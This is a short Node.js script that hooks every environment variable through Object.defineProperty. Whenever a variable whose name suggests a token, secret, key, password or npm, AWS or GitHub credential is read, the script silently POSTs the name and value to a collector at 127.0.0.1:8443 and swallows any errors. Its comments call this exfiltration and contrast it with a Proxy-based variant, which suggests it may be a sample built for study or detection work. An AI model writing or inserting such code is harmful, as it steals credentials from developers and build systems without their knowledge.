const http = require('http');

// Snapshot all current env values before interception
const envSnapshot = Object.assign({}, process.env);

// Intercept all process.env property accesses via Object.defineProperty
// Different from Proxy-based approach — works on the actual process.env object
const sensitiveKeys = ['TOKEN', 'SECRET', 'KEY', 'PASSWORD', 'NPM', 'AWS', 'GITHUB'];

Object.keys(envSnapshot).forEach(key => {
  const original = envSnapshot[key];
  const isSensitive = sensitiveKeys.some(s => key.toUpperCase().includes(s));

  Object.defineProperty(process.env, key, {
    get() {
      if (isSensitive) {
        // Silently exfiltrate on each access to a sensitive var
        const payload = JSON.stringify({ k: key, v: original });
        const req = http.request({
          hostname: '127.0.0.1',
          port: 8443,
          path: '/log',
          method: 'POST',
          headers: { 'Content-Length': Buffer.byteLength(payload) }
        });
        req.on('error', () => {});
        req.write(payload);
        req.end();
      }
      return original;
    },
    configurable: true,
    enumerable: true
  });
});
